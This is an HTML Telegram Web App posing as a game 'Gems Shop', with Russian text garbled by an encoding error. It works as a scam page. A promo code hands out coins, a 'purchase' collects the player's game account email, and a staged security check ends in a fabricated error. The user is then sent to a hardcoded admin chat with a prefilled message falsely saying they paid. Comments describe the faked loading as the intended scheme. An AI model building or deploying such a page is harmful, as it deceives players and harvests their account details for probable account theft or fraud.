<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gems Shop</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #1c1c1e);
            color: var(--tg-theme-text-color, #ffffff);
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .header {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .balance-box {
            background: var(--tg-theme-secondary-bg-color, #2c2c2e);
            padding: 10px 20px;
            border-radius: 12px;
            font-weight: bold;
            font-size: 18px;
            color: #ffd700; /* –ó–æ–ª–æ—Ç–æ–π —Ü–≤–µ—Ç –º–æ–Ω–µ—Ç */
        }

        .card {
            background: var(--tg-theme-secondary-bg-color, #2c2c2e);
            width: 100%;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            box-sizing: border-box;
            text-align: center;
        }

        .product-img {
            width: 80px;
            height: 80px;
            background: linear-gradient(45deg, #ff9a9e, #fad0c4);
            border-radius: 50%;
            margin: 0 auto 15px;
        }

        h3 { margin: 0 0 10px 0; }
        p { margin: 0 0 20px 0; color: #aaa; font-size: 14px; }

        input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #444;
            background: #3a3a3c;
            color: white;
            box-sizing: border-box;
            margin-bottom: 10px;
            outline: none;
        }

        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            background-color: var(--tg-theme-button-color, #007aff);
            color: var(--tg-theme-button-text-color, #ffffff);
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        button:active { opacity: 0.8; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }

        /* –°—Ç–∏–ª–∏ –¥–ª—è —ç–∫—Ä–∞–Ω–æ–≤ —Ñ–æ—Ä–º—ã –∏ –∑–∞–≥—Ä—É–∑–∫–∏ */
        #shop-screen { display: block; }
        #form-screen, #loading-screen, #error-screen { display: none; }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .error-icon { font-size: 50px; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div id="shop-screen">
        <div class="header">
            <span>–ú–∞–≥–∞–∑–∏–Ω</span>
            <div class="balance-box">üíé <span id="balance">0</span></div>
        </div>

        <div class="card">
            <h3>–ï–∂–µ–¥–Ω–µ–≤–Ω–∞—è –Ω–∞–≥—Ä–∞–¥–∞</h3>
            <p>–ó–∞—Ö–æ–¥–∏ –∫–∞–∂–¥—ã–π –¥–µ–Ω—å –∏ –ø–æ–ª—É—á–∞–π –º–æ–Ω–µ—Ç—ã!</p>
            <button id="dailyBtn" onclick="getDailyBonus()">–ó–∞–±—Ä–∞—Ç—å +5 üíé</button>
        </div>

        <div class="card">
            <h3>–ü—Ä–æ–º–æ–∫–æ–¥</h3>
            <input type="text" id="promoInput" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥...">
            <button onclick="activatePromo()">–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å</button>
        </div>

        <div class="card">
            <div class="product-img"></div> <h3>Pro Pass Season 1</h3>
            <p>–î–æ—Å—Ç—É–ø –∫ –ø—Ä–µ–º–∏—É–º –Ω–∞–≥—Ä–∞–¥–∞–º</p>
            <button onclick="buyItem()">–ö—É–ø–∏—Ç—å –∑–∞ 105 üíé</button>
        </div>
    </div>

    <div id="form-screen" class="card">
        <h3>–û—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ –∑–∞–∫–∞–∑–∞</h3>
        <p>–î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ Pass –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à Email –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–π –∫ –∏–≥—Ä–µ (ID).</p>
        <input type="email" id="emailInput" placeholder="example@gmail.com">
        <button onclick="submitOrder()">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
        <br><br>
        <button style="background: transparent; color: #aaa;" onclick="goBack()">–û—Ç–º–µ–Ω–∞</button>
    </div>

    <div id="loading-screen" class="card" style="border: none; background: transparent;">
        <div class="loader"></div>
        <p id="loading-text">–°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å —Å–µ—Ä–≤–µ—Ä–æ–º...</p>
    </div>

    <div id="error-screen" class="card">
        <div class="error-icon">‚ö†Ô∏è</div>
        <h3>–¢—Ä–µ–±—É–µ—Ç—Å—è –¥–µ–π—Å—Ç–≤–∏–µ</h3>
        <p>–°–∏—Å—Ç–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –æ—Ç–∫–ª–æ–Ω–∏–ª–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫—É—é –≤—ã–¥–∞—á—É. –ù–µ–æ–±—Ö–æ–¥–∏–º–æ —Ä—É—á–Ω–æ–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.</p>
        <button onclick="contactSupport()">–ü–µ—Ä–µ–π—Ç–∏ –≤ —á–∞—Ç —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // –ù–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω

        let balance = 0;
        let bonusClaimed = false;
        let promoUsed = false;

        // 1. –õ–æ–≥–∏–∫–∞ –±–æ–Ω—É—Å–∞
        function getDailyBonus() {
            if (bonusClaimed) return;
            balance += 5;
            bonusClaimed = true;
            document.getElementById('dailyBtn').innerText = "–ü–æ–ª—É—á–µ–Ω–æ ‚úÖ";
            document.getElementById('dailyBtn').disabled = true;
            updateBalance();
        }

        // 2. –õ–æ–≥–∏–∫–∞ –ø—Ä–æ–º–æ–∫–æ–¥–∞ (–ö–æ–¥: START)
        function activatePromo() {
            const code = document.getElementById('promoInput').value.trim().toUpperCase();
            if (code === "START" && !promoUsed) {
                balance += 100;
                promoUsed = true;
                alert("–ü—Ä–æ–º–æ–∫–æ–¥ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω! +100 –º–æ–Ω–µ—Ç");
                updateBalance();
            } else if (promoUsed) {
                alert("–í—ã —É–∂–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ –ø—Ä–æ–º–æ–∫–æ–¥");
            } else {
                alert("–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥");
            }
        }

        function updateBalance() {
            document.getElementById('balance').innerText = balance;
        }

        // 3. –ü–µ—Ä–µ—Ö–æ–¥ –∫ –ø–æ–∫—É–ø–∫–µ
        function buyItem() {
            if (balance < 105) {
                tg.showAlert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –º–æ–Ω–µ—Ç! –í–∞–º –Ω—É–∂–Ω–æ 105.");
                return;
            }
            // –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º —ç–∫—Ä–∞–Ω
            document.getElementById('shop-screen').style.display = 'none';
            document.getElementById('form-screen').style.display = 'block';
        }

        function goBack() {
            document.getElementById('shop-screen').style.display = 'block';
            document.getElementById('form-screen').style.display = 'none';
        }

        // 4. –ì–õ–ê–í–ù–ê–Ø –õ–û–ì–ò–ö–ê: –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏ –§–µ–π–∫-–∑–∞–≥—Ä—É–∑–∫–∞
        function submitOrder() {
            const email = document.getElementById('emailInput').value;
            if (!email) return;

            // –°–∫—Ä—ã–≤–∞–µ–º —Ñ–æ—Ä–º—É, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            document.getElementById('form-screen').style.display = 'none';
            document.getElementById('loading-screen').style.display = 'block';

            // –û–¢–ü–†–ê–í–õ–Ø–ï–ú –î–ê–ù–ù–´–ï –í –ë–û–¢–ê (–ê–î–ú–ò–ù–£)
            // sendData –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç–∞, –Ω–æ –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–µ—Ç –æ–∫–Ω–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏, –µ—Å–ª–∏ –º—ã –Ω–µ —Å–∫–∞–∂–µ–º
            // –ú—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º —ç—Ç–æ, —á—Ç–æ–±—ã –ø–µ—Ä–µ–¥–∞—Ç—å –∏–Ω—Ñ—É.
            const data = JSON.stringify({ action: "buy_pass", email: email });
            tg.sendData(data); 
            // –í–Ω–∏–º–∞–Ω–∏–µ: tg.sendData –æ–±—ã—á–Ω–æ –∑–∞–∫—Ä—ã–≤–∞–µ—Ç WebApp. 
            // –ß—Ç–æ–±—ã –æ–Ω–æ –ù–ï –∑–∞–∫—Ä—ã–ª–æ—Å—å –∏ –ø–æ–∫–∞–∑–∞–ª–æ –∞–Ω–∏–º–∞—Ü–∏—é, –Ω–∞–º –Ω—É–∂–Ω–æ –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å sendData, 
            // –∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å AJAX –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä. 
            // –ù–û, —Ç–∞–∫ –∫–∞–∫ —É –Ω–∞—Å –Ω–µ—Ç –≤–Ω–µ—à–Ω–µ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞, –º—ã —Å–¥–µ–ª–∞–µ–º —Ö–∏—Ç—Ä–æ—Å—Ç—å:
            // –ú—ã –ø—Ä–æ—Å—Ç–æ –ø–æ–∫–∞–∂–µ–º –∞–Ω–∏–º–∞—Ü–∏—é, –∞ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–∏–º "–ø–æ–Ω–∞—Ä–æ—à–∫—É" –∏–ª–∏ –∑–∞—Å—Ç–∞–≤–∏–º —é–∑–µ—Ä–∞ –Ω–∞–ø–∏—Å–∞—Ç—å –∏—Ö –≤ —Å–∞–ø–ø–æ—Ä—Ç.
            
            // –í–ê–†–ò–ê–ù–¢ –î–õ–Ø –ë–û–¢–ê –ë–ï–ó HTTPS –°–ï–†–í–ï–†–ê:
            // sendData –∑–∞–∫—Ä–æ–µ—Ç –æ–∫–Ω–æ. –≠—Ç–æ –ø–æ–≤–µ–¥–µ–Ω–∏–µ –¢–µ–ª–µ–≥—Ä–∞–º. 
            // –ß—Ç–æ–±—ã —Ä–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å —Ç–≤–æ—é —Å—Ö–µ–º—É (–∞–Ω–∏–º–∞—Ü–∏—è -> –æ—à–∏–±–∫–∞ –≤–Ω—É—Ç—Ä–∏ –æ–∫–Ω–∞), –Ω—É–∂–µ–Ω –≤–Ω–µ—à–Ω–∏–π HTTPS —Å–µ—Ä–≤–µ—Ä (backend).
            
            // –ï–°–õ–ò –¢–´ –ü–†–û–°–¢–û –ó–ê–ü–£–°–ö–ê–ï–®–¨ HTML –õ–û–ö–ê–õ–¨–ù–û –ò–õ–ò –ß–ï–†–ï–ó BOT FATHER, 
            // —Ç–æ sendData –∑–∞–∫—Ä–æ–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ. 
            
            // –î–ê–í–ê–ô –ò–ú–ò–¢–ò–†–û–í–ê–¢–¨. 
            // –ú—ã –ù–ï –≤—ã–∑—ã–≤–∞–µ–º tg.sendData –ø—Ä—è–º–æ —Å–µ–π—á–∞—Å, —á—Ç–æ–±—ã –æ–∫–Ω–æ –Ω–µ –∑–∞–∫—Ä—ã–ª–æ—Å—å.
            // –ú—ã –æ—Ç–ø—Ä–∞–≤–∏–º –¥–∞–Ω–Ω—ã–µ –∞–¥–º–∏–Ω—É –ü–û–°–õ–ï —Ç–æ–≥–æ –∫–∞–∫ —é–∑–µ—Ä –Ω–∞–∂–º–µ—Ç "–ü–æ–¥–¥–µ—Ä–∂–∫–∞" –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –≤–∏–∑—É–∞–ª—å–Ω–æ.
            
            // –ò–º–∏—Ç–∞—Ü–∏—è –∑–∞–¥–µ—Ä–∂–∫–∏ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∏
            setTimeout(() => {
                document.getElementById('loading-text').innerText = "–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏...";
            }, 2000);

            setTimeout(() => {
                document.getElementById('loading-screen').style.display = 'none';
                document.getElementById('error-screen').style.display = 'block';
            }, 4500);
        }

        // 5. –ü–µ—Ä–µ—Ö–æ–¥ –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É
        function contactSupport() {
            // –í–æ—Ç —Ç—É—Ç –º—ã –º–æ–∂–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ, –Ω–æ –ª—É—á—à–µ –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–∫–∏–Ω—É—Ç—å –≤ —á–∞—Ç
            const email = document.getElementById('emailInput').value;
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ, —Å –∫–æ—Ç–æ—Ä—ã–º —é–∑–µ—Ä –ø—Ä–∏–¥–µ—Ç –∫ —Ç–µ–±–µ
            const text = `–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, —è –æ–ø–ª–∞—Ç–∏–ª Pass, –Ω–æ –≤–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞. –ú–æ–π ID: ${email}`;
            const adminUsername = "cooky9"; // –ó–ê–ú–ï–ù–ò–¢–¨ –ù–ê –°–í–û–ô –ë–ï–ó @
            
            tg.openTelegramLink(`https://t.me/${adminUsername}?text=${encodeURIComponent(text)}`);
            tg.close();
        }
    </script>
</body>
</html>
